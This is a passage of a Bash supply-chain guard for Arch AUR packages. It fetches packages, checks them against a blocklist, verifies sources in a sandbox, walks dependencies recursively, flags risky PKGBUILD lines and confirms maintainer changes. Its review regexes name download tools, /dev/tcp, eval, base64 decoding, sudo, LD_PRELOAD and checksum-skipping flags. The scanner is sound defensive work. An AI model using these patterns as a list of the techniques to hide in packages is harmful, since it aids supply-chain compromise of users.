  [[ -n "$pkgbase" ]] || return 1
  _aur_guard_validate_package_name "$pkgbase" || return 1
  [[ "$maintainer" == '<orphaned>' || "$maintainer" =~ ^[[:alnum:]_.@+-]+$ ]] || return 1
  [[ "$last_modified" =~ ^[0-9]+$ ]] || return 1

  if [[ -n ${_AUR_GUARD_AUR_METADATA:-} ]]; then
    if ! awk -F '\t' -v base="$pkgbase" '$1 == base {found = 1} END {exit !found}' \
        "$_AUR_GUARD_AUR_METADATA" 2>/dev/null; then
      printf '%s\t%s\t%s\n' "$pkgbase" "$maintainer" "$last_modified" \
        >> "$_AUR_GUARD_AUR_METADATA"
    fi
  fi

  mkdir -p "$fetch_parent" || return 1
  pkgdir="$fetch_parent/$pkgbase"
  rm -rf "$pkgdir"

  if ! _aur_guard_sandbox_exec \
      "$fetch_parent" allow writable / \
      /usr/bin/git clone \
        --quiet \
        --no-hardlinks \
        -- "https://aur.archlinux.org/${pkgbase}.git" "/work/$pkgbase"; then
    return 1
  fi

  [[ -d "$pkgdir/.git" ]] || return 1
  _aur_guard_validate_checkout_tree "$pkgbase" "$pkgdir" || return 1
  remote=$(command git -C "$pkgdir" remote get-url origin 2>/dev/null) || return 1
  _aur_guard_validate_official_remote "$pkgbase" "$remote" || return 1

  printf '%s\n' "$pkgdir"
}

_aur_guard_verify_package_recursive() {
  local pkg="$1"
  local parent="$2"
  local fetch_parent pkgdir pkgbase fetched_pkgbase commit remote srcinfo
  local split_pkg dep_spec dep_name provider exact_aur_pkg
  local -a providers=()

  [[ -n "$pkg" ]] || return 1
  _aur_guard_validate_package_name "$pkg" || return 1

  if [[ ${_AUR_GUARD_REQUEST_STATE[$pkg]+set} ]]; then
    case "${_AUR_GUARD_REQUEST_STATE[$pkg]}" in
      done) return 0 ;;
      active) return 0 ;;
      failed) return 1 ;;
    esac
  fi
  _AUR_GUARD_REQUEST_STATE[$pkg]='active'

  if ! _aur_guard_check_emergency_block "$pkg"; then
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "$pkg is present on the Awtarchy emergency blocklist"
    return 1
  fi
  _aur_guard_note_historical_match "$pkg"

  fetch_parent="$_AUR_GUARD_WORK_DIR/fetch/${pkg//[^a-zA-Z0-9._+-]/_}"
  rm -rf "$fetch_parent"

  pkgdir=$(_aur_guard_fetch_package "$pkg" "$fetch_parent") || {
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "failed to fetch AUR package $pkg"
    return 1
  }
  fetched_pkgbase="${pkgdir##*/}"

  _aur_guard_scan_package_files "$pkg" "$pkgdir" || {
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_scan_checkout_with_aur_scan "$pkg" "$pkgdir" || {
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_verify_srcinfo "$pkg" "$pkgdir" || {
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  srcinfo="$pkgdir/.SRCINFO.verified"
  pkgbase=$(awk -F ' = ' '/^[[:space:]]*pkgbase = / {print $2; exit}' "$srcinfo")
  [[ -n "$pkgbase" ]] || pkgbase="$pkg"
  _aur_guard_validate_package_name "$pkgbase" || {
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }
  if [[ "$pkgbase" != "$fetched_pkgbase" ]]; then
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "$pkg committed .SRCINFO reports package base $pkgbase but the official AUR RPC returned $fetched_pkgbase"
    return 1
  fi
  _aur_guard_record_required_package "$pkgbase" "$pkg"

  if [[ ${_AUR_GUARD_BASE_STATE[$pkgbase]+set} ]]; then
    case "${_AUR_GUARD_BASE_STATE[$pkgbase]}" in
      done|active)
        _AUR_GUARD_REQUEST_STATE[$pkg]='done'
        rm -rf "$fetch_parent"
        return 0
        ;;
      failed)
        _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
        rm -rf "$fetch_parent"
        return 1
        ;;
    esac
  fi
  _AUR_GUARD_BASE_STATE[$pkgbase]='active'

  if ! _aur_guard_check_emergency_block "$pkgbase"; then
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "$pkgbase is present on the Awtarchy emergency blocklist"
    return 1
  fi
  _aur_guard_note_historical_match "$pkgbase"

  while IFS= read -r split_pkg; do
    [[ -n "$split_pkg" ]] || continue
    _aur_guard_validate_package_name "$split_pkg" || {
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      return 1
    }
    if ! _aur_guard_check_emergency_block "$split_pkg"; then
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      _aur_guard_fail "$split_pkg from package base $pkgbase is emergency-blocked"
      return 1
    fi
    _aur_guard_note_historical_match "$split_pkg"
  done < <(awk -F ' = ' '/^[[:space:]]*pkgname = / {print $2}' "$srcinfo")

  _aur_guard_validate_source_origins "$pkgbase" "$srcinfo" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_validate_skipped_integrity "$pkgbase" "$srcinfo" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_prepare_public_keyring "$pkgdir" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  printf 'AUR Verify: verifying downloaded sources for %s inside bubblewrap.\n' "$pkgbase"
  if ! _aur_guard_makepkg_sandbox "$pkgdir" allow writable \
      --verifysource --noconfirm --nocolor; then
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "source checksum or PGP verification failed for $pkgbase"
    return 1
  fi

  _aur_guard_assert_tracked_files_unchanged "$pkgbase" "$pkgdir" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_capture_git_snapshots "$pkgbase" "$srcinfo" "$pkgdir" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_verify_github_release_asset_digests "$pkgbase" "$srcinfo" "$pkgdir" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_verify_content_addressed_sources "$pkgbase" "$srcinfo" "$pkgdir" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  if _aur_guard_is_deep_mode; then
    _aur_guard_scan_source_tree "$pkgbase" "$pkgdir" top || {
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      return 1
    }

    rm -rf "$pkgdir/.awtarchy-build"
    mkdir -p "$pkgdir/.awtarchy-build" || return 1

    printf 'AUR Verify: deep mode is extracting and recursively scanning verified upstream sources for %s.\n' \
      "$pkgbase"
    _aur_guard_prepare_pkgbuild_mutation_state "$pkgbase" "$pkgdir" || {
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      return 1
    }
    if ! _aur_guard_makepkg_sandbox "$pkgdir" deny writable \
        --nobuild --noprepare --nodeps --holdver --noconfirm --nocolor; then
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      _aur_guard_fail "could not safely extract verified sources for $pkgbase"
      return 1
    fi

    _aur_guard_accept_prepared_pkgver_update "$pkgbase" "$pkgdir" || {
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      return 1
    }
    _aur_guard_restore_original_pkgbuild "$pkgbase" "$pkgdir" || {
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      return 1
    }

    _aur_guard_scan_source_tree "$pkgbase" "$pkgdir/.awtarchy-build" recursive || {
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      return 1
    }

    _aur_guard_validate_dependency_evidence \
      "$pkgbase" "$srcinfo" "$pkgdir" "$pkgdir/.awtarchy-build" || {
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      return 1
    }
  else
    printf 'AUR Verify: practical mode trusts checksum-verified upstream contents and skips recursive upstream/dependency scanning for %s.\n' \
      "$pkgbase"
  fi

  commit=$(git -C "$pkgdir" rev-parse HEAD 2>/dev/null) || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "could not read AUR commit for $pkgbase"
    return 1
  }
  remote=$(git -C "$pkgdir" remote get-url origin 2>/dev/null) || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "could not read AUR remote for $pkgbase"
    return 1
  }
  _aur_guard_validate_official_remote "$pkgbase" "$remote" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  while IFS= read -r dep_spec; do
    [[ -n "$dep_spec" ]] || continue
    dep_name=$(_aur_guard_dependency_name "$dep_spec")
    [[ -n "$dep_name" ]] || continue
    _aur_guard_validate_package_name "$dep_name" || {
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      return 1
    }

    if ! _aur_guard_check_emergency_block "$dep_name"; then
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      _aur_guard_fail "$pkgbase depends on emergency-blocked package $dep_name"
      return 1
    fi

    # Prefer an exact enabled-repository package over an installed virtual
    # provider. Clean build roots should use the package named by the
    # dependency when that exact package exists.
    if _aur_guard_repo_package_satisfies "$dep_spec" "$dep_name"; then
      printf 'AUR Verify: %s dependency %s is available from an enabled repository.\n' \
        "$pkgbase" "$dep_name"
      _aur_guard_record_repo_dependency "$dep_name"
      continue
    fi

    provider=$(_aur_guard_find_installed_provider "$dep_name")
    if [[ -n "$provider" ]] && command pacman -T "$dep_spec" >/dev/null 2>&1; then
      if command pacman -Qm "$provider" >/dev/null 2>&1; then
        printf 'AUR Verify: %s depends on installed foreign package %s.\n' "$pkgbase" "$provider"
        _aur_guard_verify_package_recursive "$provider" "$pkgbase" || {
          _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
          _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
          return 1
        }
      else
        printf 'AUR Verify: %s dependency %s is satisfied by repository package %s.\n' \
          "$pkgbase" "$dep_name" "$provider"
        _aur_guard_record_repo_dependency "$provider"
      fi
      continue
    fi

    exact_aur_pkg=$(_aur_guard_rpc_exact_package "$dep_name")
    if [[ -n "$exact_aur_pkg" ]]; then
      _aur_guard_verify_package_recursive "$exact_aur_pkg" "$pkgbase" || {
        _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
        _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
        return 1
      }
      continue
    fi

    mapfile -t providers < <(_aur_guard_rpc_providers "$dep_name")
    if (( ${#providers[@]} == 1 )); then
      printf 'AUR Verify: resolved virtual dependency %s to AUR package %s.\n' \
        "$dep_name" "${providers[0]}"
      _aur_guard_verify_package_recursive "${providers[0]}" "$pkgbase" || {
        _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
        _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
        return 1
      }
      continue
    fi

    if (( ${#providers[@]} > 1 )); then
      _aur_guard_fail "$pkgbase has ambiguous AUR dependency $dep_name"
      printf 'Possible providers:\n' >&2
      printf '  %s\n' "${providers[@]}" >&2
    else
      _aur_guard_fail "$pkgbase has unresolved dependency $dep_spec"
    fi
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  done < <(
    awk -F ' = ' '
      /^[[:space:]]*(depends|makedepends|checkdepends)(_[[:alnum:]_]+)? = / {
        print $2
      }
    ' "$srcinfo" | LC_ALL=C sort -u
  )

  # Append after dependencies so the manifest is in build order: dependencies first.
  printf '%s\t%s\t%s\t%s\t%s\n' \
    "$pkgbase" "$commit" "$remote" "$parent" "$pkgdir" \
    >> "$_AUR_GUARD_MANIFEST"

  _AUR_GUARD_BASE_STATE[$pkgbase]='done'
  _AUR_GUARD_REQUEST_STATE[$pkg]='done'
  return 0
}

_aur_guard_pkgbuild_review_reason() {
  local line="$1"

  line="${line#?}"
  [[ "$line" =~ ^[[:space:]]*# ]] && return 1

  if grep -Eiq '(^|[;&|[:space:]])(curl|wget|fetch|aria2c)([[:space:]]|$)|git[[:space:]]+clone([[:space:]]|$)' <<< "$line"; then
    printf '%s\n' 'network/download'
    return 0
  fi

  if grep -Eiq '(^|[;&|[:space:]])(eval|source)([[:space:]]|$)|(^|[;&|[:space:]])(bash|sh|zsh|python3?|node)[[:space:]]+-[ce]([[:space:]]|$)|base64[[:space:]].*(-d|--decode)|/dev/(tcp|udp)' <<< "$line"; then
    printf '%s\n' 'dynamic execution'
    return 0
  fi

  if grep -Eiq '(^|[;&|[:space:]])(sudo|pkexec|systemctl|useradd|groupadd|crontab)([[:space:]]|$)|(^|[;&|[:space:]])setcap([[:space:]]|$)|chmod[[:space:]][^#]*(u\+s|g\+s|[2467][0-9]{3})|LD_PRELOAD|(^|[^[:alnum:]_])(/etc/|/usr/lib/systemd/|\.config/autostart/)' <<< "$line"; then
    printf '%s\n' 'privilege/system change'
    return 0
  fi

  if grep -Eiq '(^|[;&|[:space:]])(npm|pnpm|yarn|bun|pip|pip3|cargo)[[:space:]]+(install|add)([[:space:]]|$)' <<< "$line"; then
    printf '%s\n' 'dependency installer'
    return 0
  fi

  if grep -Eiq '(^|[^[:alnum:]_])SKIP([^[:alnum:]_]|$)|--(skipchecksums|skippgpcheck|skipinteg)' <<< "$line"; then
    printf '%s\n' 'integrity bypass'
    return 0
  fi

  return 1
}

_aur_guard_review_color_enabled() {
  [[ ${AUR_GUARD_COLOR:-auto} == always ]] && return 0
  [[ ${AUR_GUARD_COLOR:-auto} == never ]] && return 1
  [[ -t 1 && ${TERM:-dumb} != dumb && -z ${NO_COLOR:-} ]]
}

_aur_guard_print_pkgbuild_diff_header() {
  local use_color=false reset=''

  if _aur_guard_review_color_enabled; then
    use_color=true
    reset=$'\033[0m'
  fi

  if $use_color; then
    printf '\033[1;36m%6s %6s │ %s%s\n' 'OLD' 'NEW' 'PKGBUILD' "$reset"
    printf '\033[1;36m───────────────┼────────────────────────────────────────────────────────%s\n' "$reset"
  else
    printf '%6s %6s │ %s\n' 'OLD' 'NEW' 'PKGBUILD'
    printf '───────────────┼────────────────────────────────────────────────────────\n'
  fi
}

_aur_guard_print_pkgbuild_source_header() {
  local use_color=false reset=''

  if _aur_guard_review_color_enabled; then
    use_color=true
    reset=$'\033[0m'
  fi

  if $use_color; then
    printf '\033[1;36m%6s │ %s%s\n' 'LINE' 'PKGBUILD' "$reset"
    printf '\033[1;36m───────┼────────────────────────────────────────────────────────────────%s\n' "$reset"
  else
    printf '%6s │ %s\n' 'LINE' 'PKGBUILD'
    printf '───────┼────────────────────────────────────────────────────────────────\n'
  fi
}

_aur_guard_print_pkgbuild_diff_row() {
  local old_number="$1"
  local new_number="$2"
  local marker="$3"
  local content="$4"
  local inspect_added="${5:-false}"
  local reason='' use_color=false reset=''

  if [[ "$inspect_added" == true ]]; then
    reason=$(_aur_guard_pkgbuild_review_reason " $content" 2>/dev/null || true)
  fi

  if _aur_guard_review_color_enabled; then
    use_color=true
    reset=$'\033[0m'
  fi

  if $use_color; then
    printf '\033[2;36m%6s %6s\033[0m \033[1;36m│\033[0m ' "$old_number" "$new_number"
    if [[ -n "$reason" ]]; then
      printf '\033[1;31m%s %s  [FLAGGED: %s]%s\n' "$marker" "$content" "$reason" "$reset"
    else
      printf '\033[0;32m%s %s%s\n' "$marker" "$content" "$reset"
    fi
  elif [[ -n "$reason" ]]; then
    printf '%6s %6s │ %s %s  [FLAGGED: %s]\n' \
      "$old_number" "$new_number" "$marker" "$content" "$reason"
  else
    printf '%6s %6s │ %s %s\n' \
      "$old_number" "$new_number" "$marker" "$content"
  fi
}

_aur_guard_print_pkgbuild_source_row() {
  local line_number="$1"
  local content="$2"
  local reason='' use_color=false reset=''

  reason=$(_aur_guard_pkgbuild_review_reason " $content" 2>/dev/null || true)

  if _aur_guard_review_color_enabled; then
    use_color=true
    reset=$'\033[0m'
  fi

  if $use_color; then
    printf '\033[2;36m%6s\033[0m \033[1;36m│\033[0m ' "$line_number"
    if [[ -n "$reason" ]]; then
      printf '\033[1;31m%s  [FLAGGED: %s]%s\n' "$content" "$reason" "$reset"
    else
      printf '\033[0;32m%s%s\n' "$content" "$reset"
    fi
  elif [[ -n "$reason" ]]; then
    printf '%6s │ %s  [FLAGGED: %s]\n' "$line_number" "$content" "$reason"
  else
    printf '%6s │ %s\n' "$line_number" "$content"
  fi
}

_aur_guard_render_pkgbuild_diff() {
  local old_file="$1"
  local new_file="$2"
  local old_label="$3"
  local new_label="$4"
  local diff_file line content old_number new_number status=0 first_hunk=true

  diff_file=$(mktemp) || return 1
  diff -u --label "$old_label" --label "$new_label" \
    "$old_file" "$new_file" > "$diff_file" || status=$?

  if (( status > 1 )); then
    rm -f -- "$diff_file"
    return "$status"
  fi

  if (( status == 0 )); then
    printf 'No PKGBUILD changes were found.\n'
    rm -f -- "$diff_file"
    return 0
  fi

  _aur_guard_print_pkgbuild_diff_header

  old_number=0
  new_number=0
  while IFS= read -r line || [[ -n "$line" ]]; do
    case "$line" in
      '--- '*|'+++ '*)
        continue
        ;;
      '@@ '*)
        if [[ "$line" =~ ^@@\ -([0-9]+)(,([0-9]+))?\ \+([0-9]+)(,([0-9]+))?\ @@ ]]; then
          old_number=${BASH_REMATCH[1]}
          new_number=${BASH_REMATCH[4]}
          if $first_hunk; then
            first_hunk=false
          else
            printf '\n'
          fi
        fi
        continue
        ;;
      '\ No newline at end of file')
        continue
        ;;
      +*)
        content=${line:1}
        _aur_guard_print_pkgbuild_diff_row '' "$new_number" '+' "$content" true
        ((new_number += 1))
        ;;
      -*)
        content=${line:1}
        _aur_guard_print_pkgbuild_diff_row "$old_number" '' '-' "$content" false
        ((old_number += 1))
        ;;
      ' '*)
        content=${line:1}
        _aur_guard_print_pkgbuild_diff_row "$old_number" "$new_number" ' ' "$content" false
        ((old_number += 1))
        ((new_number += 1))
        ;;
    esac
  done < "$diff_file"

  rm -f -- "$diff_file"
}

_aur_guard_render_current_pkgbuild() {
  local pkgbuild="$1"
  local line line_number=0

  _aur_guard_print_pkgbuild_source_header
  while IFS= read -r line || [[ -n "$line" ]]; do
    ((line_number += 1))
    _aur_guard_print_pkgbuild_source_row "$line_number" "$line"
  done < "$pkgbuild"
}

_aur_guard_installed_versions_for_base() {
  local pkgbase="$1"
  local required_base pkgname version
  local found=false

  while IFS=$'\t' read -r required_base pkgname; do
    [[ "$required_base" == "$pkgbase" && -n "$pkgname" ]] || continue
    version=$(command pacman -Q "$pkgname" 2>/dev/null | awk '{print $2; exit}') || true
    [[ -n "$version" ]] || continue
    printf '%s=%s\n' "$pkgname" "$version"
    found=true
  done < "$_AUR_GUARD_REQUIRED_PACKAGES"

  $found
}

_aur_guard_current_metadata_for_base() {
  local pkgbase="$1"

  [[ -n ${_AUR_GUARD_AUR_METADATA:-} \
      && -f $_AUR_GUARD_AUR_METADATA \
      && ! -L $_AUR_GUARD_AUR_METADATA ]] || return 1

  awk -F '\t' -v base="$pkgbase" '
    $1 == base {
      maintainer = $2
      modified = $3
    }
    END {
      if (maintainer != "") {
        printf "%s\t%s\n", maintainer, modified
      } else {
        exit 1
      }
    }
  ' "$_AUR_GUARD_AUR_METADATA"
}

_aur_guard_saved_metadata_value() {
  local pkgbase="$1"
  local key="$2"
  local metadata="$_AUR_GUARD_STATE_DIR/pkgbuilds/$pkgbase/metadata"

  [[ -e "$metadata" ]] || return 1
  [[ -f "$metadata" && ! -L "$metadata" ]] || return 2

  awk -F '=' -v wanted="$key" '
    $1 == wanted {
      sub(/^[^=]*=/, "")
      print
      found = 1
      exit
    }
    END {
      if (!found) {
        exit 1
      }
    }
  ' "$metadata"
}

_aur_guard_revision_age_seconds() {
  local last_modified="$1"
  local now age

  [[ "$last_modified" =~ ^[0-9]+$ && "$last_modified" != 0 ]] || return 1
  now=$(date +%s) || return 1
  age=$((now - last_modified))
  (( age < 0 )) && age=0
  printf '%s\n' "$age"
}

_aur_guard_format_revision_age() {
  local last_modified="$1"
  local age days hours minutes

  age=$(_aur_guard_revision_age_seconds "$last_modified") || {
    printf '%s\n' 'unknown'
    return 0
  }

  days=$((age / 86400))
  hours=$(((age % 86400) / 3600))
  minutes=$(((age % 3600) / 60))

  if (( days > 0 )); then
    printf '%dd %dh\n' "$days" "$hours"
  elif (( hours > 0 )); then
    printf '%dh %dm\n' "$hours" "$minutes"
  else
    printf '%dm\n' "$minutes"
  fi
}

_aur_guard_revision_is_recent() {
  local last_modified="$1"
  local threshold_hours="${AUR_GUARD_RECENT_CHANGE_HOURS:-72}"
  local age

  [[ "$threshold_hours" =~ ^[0-9]+$ ]] || threshold_hours=72
  age=$(_aur_guard_revision_age_seconds "$last_modified") || return 1
  (( age <= threshold_hours * 3600 ))
}

_aur_guard_count_flagged_pkgbuild_lines() {
  local current="$1"
  local previous="${2:-}"
  local line content reason diff_file status=0 count=0

  [[ -f "$current" && ! -L "$current" ]] || return 1

  if [[ -n "$previous" && -f "$previous" && ! -L "$previous" ]]; then
    diff_file=$(mktemp) || return 1
    diff -u -- "$previous" "$current" > "$diff_file" || status=$?
    if (( status > 1 )); then
      rm -f -- "$diff_file"
      return "$status"
    fi

    while IFS= read -r line || [[ -n "$line" ]]; do
      case "$line" in
        '+++ '*|'--- '*)
          continue
          ;;
        +*)
          content=${line:1}
          reason=$(_aur_guard_pkgbuild_review_reason " $content" 2>/dev/null || true)
          [[ -n "$reason" ]] && count=$((count + 1))
          ;;
      esac
    done < "$diff_file"
    rm -f -- "$diff_file"
  else
    while IFS= read -r line || [[ -n "$line" ]]; do
      reason=$(_aur_guard_pkgbuild_review_reason " $line" 2>/dev/null || true)
      [[ -n "$reason" ]] && count=$((count + 1))
    done < "$current"
  fi

  printf '%s\n' "$count"
}

_aur_guard_assess_aur_identity() {
  local pkgbase commit remote parent pkgdir versions current
  local current_maintainer last_modified previous_maintainer saved_status

  [[ -n ${_AUR_GUARD_IDENTITY_CHANGES:-} ]] || return 1
  : > "$_AUR_GUARD_IDENTITY_CHANGES" || return 1

  while IFS=$'\t' read -r pkgbase commit remote parent pkgdir; do
    [[ -n "$pkgbase" ]] || continue
    versions=$(_aur_guard_installed_versions_for_base "$pkgbase" 2>/dev/null || true)
    [[ -n "$versions" ]] || continue

    current=$(_aur_guard_current_metadata_for_base "$pkgbase") || {
      _aur_guard_fail "current AUR maintainer metadata is unavailable for installed package base $pkgbase"
      return 1
    }
    IFS=$'\t' read -r current_maintainer last_modified <<< "$current"

    previous_maintainer=
    if previous_maintainer=$(_aur_guard_saved_metadata_value "$pkgbase" maintainer 2>/dev/null); then
      :
    else
      saved_status=$?
      if (( saved_status == 2 )); then
        _aur_guard_fail "unsafe saved AUR metadata path detected for $pkgbase"
        return 1
      fi
      previous_maintainer=
    fi

    if [[ -n "$previous_maintainer" && "$previous_maintainer" != "$current_maintainer" ]]; then
      printf '%s\t%s\t%s\t%s\t%s\n' \
        "$pkgbase" "$previous_maintainer" "$current_maintainer" \
        "$last_modified" "$commit" >> "$_AUR_GUARD_IDENTITY_CHANGES"
    fi
  done < "$_AUR_GUARD_MANIFEST"

  _AUR_GUARD_IDENTITY_ASSESSED=1
  [[ -s "$_AUR_GUARD_IDENTITY_CHANGES" ]] && return 10
  return 0
}

_aur_guard_identity_change_for_base() {
  local pkgbase="$1"

  [[ -n ${_AUR_GUARD_IDENTITY_CHANGES:-} \
      && -f $_AUR_GUARD_IDENTITY_CHANGES \
      && ! -L $_AUR_GUARD_IDENTITY_CHANGES ]] || return 1

  awk -F '\t' -v base="$pkgbase" '
    $1 == base {
      printf "%s\t%s\n", $2, $3
      found = 1
      exit
    }
    END {
      if (!found) {
        exit 1
      }
    }
  ' "$_AUR_GUARD_IDENTITY_CHANGES"
}

_aur_guard_identity_confirmation_phrase() {
  local token

  [[ -n ${_AUR_GUARD_IDENTITY_CHANGES:-} \
      && -s $_AUR_GUARD_IDENTITY_CHANGES \
      && ! -L $_AUR_GUARD_IDENTITY_CHANGES ]] || return 1

  token=$(sha256sum -- "$_AUR_GUARD_IDENTITY_CHANGES" \
    | awk '{print substr($1, 1, 12)}') || return 1
  printf 'CONTINUE MAINTAINER %s\n' "$token"
}

_aur_guard_confirm_identity_changes() {
  local pkgbase previous current last_modified commit answer phrase

  [[ -n ${_AUR_GUARD_IDENTITY_CHANGES:-} \
      && -s $_AUR_GUARD_IDENTITY_CHANGES ]] || return 0

  phrase=$(_aur_guard_identity_confirmation_phrase) || return 1

  printf '\n\033[1;31mCRITICAL AUR MAINTAINER CHANGE\033[0m\n' >&2
  while IFS=$'\t' read -r pkgbase previous current last_modified commit; do
    printf '  %s: %s -> %s | revision age: %s | commit: %s\n' \
      "$pkgbase" "$previous" "$current" \
      "$(_aur_guard_format_revision_age "$last_modified")" "${commit:0:12}" >&2
  done < "$_AUR_GUARD_IDENTITY_CHANGES"
  printf 'AUR Guard forced deep verification and displayed the PKGBUILD review.\n' >&2
  printf 'Type exactly %s to continue building: ' "$phrase" >&2

  if [[ ${AUR_GUARD_TEST_MODE:-0} == 1 ]]; then
    IFS= read -r answer || return 1
  else
    if [[ ! -r /dev/tty ]]; then
      printf '\nNo readable terminal is available for maintainer-change confirmation.\n' >&2
      return 1
    fi
    IFS= read -r answer </dev/tty || return 1
  fi

  [[ "$answer" == "$phrase" ]]
}

_aur_guard_review_installed_pkgbuilds() {
  local pkgbase commit remote parent pkgdir versions snapshot answer entry kind
  local current current_maintainer last_modified previous_maintainer saved_status
  local identity flagged age threshold_hours previous_for_scan
  local reset='' green='' yellow='' red='' cyan='' bold=''
  local mandatory_review=false
  local -a all_entries=()
  local -a review_entries=()

  if [[ ${_AUR_GUARD_IDENTITY_ASSESSED:-0} != 1 ]]; then
    if _aur_guard_assess_aur_identity; then
      :
    else
      case "$?" in
        10) ;;
        *) return 1 ;;
      esac
    fi
  fi

  threshold_hours="${AUR_GUARD_RECENT_CHANGE_HOURS:-72}"
  [[ "$threshold_hours" =~ ^[0-9]+$ ]] || threshold_hours=72

  if _aur_guard_review_color_enabled; then
    reset=$'\033[0m'
    green=$'\033[1;32m'
    yellow=$'\033[1;33m'
    red=$'\033[1;31m'
    cyan=$'\033[1;36m'
    bold=$'\033[1m'
  fi

  while IFS=$'\t' read -r pkgbase commit remote parent pkgdir; do
    [[ -n "$pkgbase" && -f "$pkgdir/PKGBUILD" && ! -L "$pkgdir/PKGBUILD" ]] || continue
    versions=$(_aur_guard_installed_versions_for_base "$pkgbase" 2>/dev/null || true)
    [[ -n "$versions" ]] || continue

    current=$(_aur_guard_current_metadata_for_base "$pkgbase") || {
      _aur_guard_fail "current AUR metadata is unavailable for installed package base $pkgbase"
      return 1
    }
    IFS=$'\t' read -r current_maintainer last_modified <<< "$current"

    previous_maintainer=
    if previous_maintainer=$(_aur_guard_saved_metadata_value "$pkgbase" maintainer 2>/dev/null); then
      :
    else
      saved_status=$?
      if (( saved_status == 2 )); then
        _aur_guard_fail "unsafe saved AUR metadata path detected for $pkgbase"
        return 1
      fi
      previous_maintainer=
    fi

    snapshot="$_AUR_GUARD_STATE_DIR/pkgbuilds/$pkgbase/PKGBUILD"
    if [[ -f "$snapshot" && ! -L "$snapshot" ]]; then
      if cmp -s -- "$snapshot" "$pkgdir/PKGBUILD"; then
        kind='unchanged'
      else
        kind='diff'
      fi
    elif [[ -e "$snapshot" ]]; then
      _aur_guard_fail "unsafe saved PKGBUILD snapshot path detected for $pkgbase"
      return 1
    else
      kind='current'
    fi

    previous_for_scan=
    [[ "$kind" == diff ]] && previous_for_scan="$snapshot"
    flagged=$(_aur_guard_count_flagged_pkgbuild_lines \
      "$pkgdir/PKGBUILD" "$previous_for_scan") || return 1

    identity='unchanged'
    if _aur_guard_identity_change_for_base "$pkgbase" >/dev/null 2>&1; then
      identity='changed'
      mandatory_review=true
    elif [[ -z "$previous_maintainer" ]]; then
      identity='baseline-missing'
    fi

    all_entries+=(
      "$pkgbase"$'\t'"$commit"$'\t'"$pkgdir"$'\t'"$snapshot"$'\t'"$kind"$'\t'"${versions//$'\n'/, }"$'\t'"$current_maintainer"$'\t'"$previous_maintainer"$'\t'"$last_modified"$'\t'"$flagged"$'\t'"$identity"
    )

    if [[ "$kind" != unchanged || "$identity" == changed ]]; then
      review_entries+=(
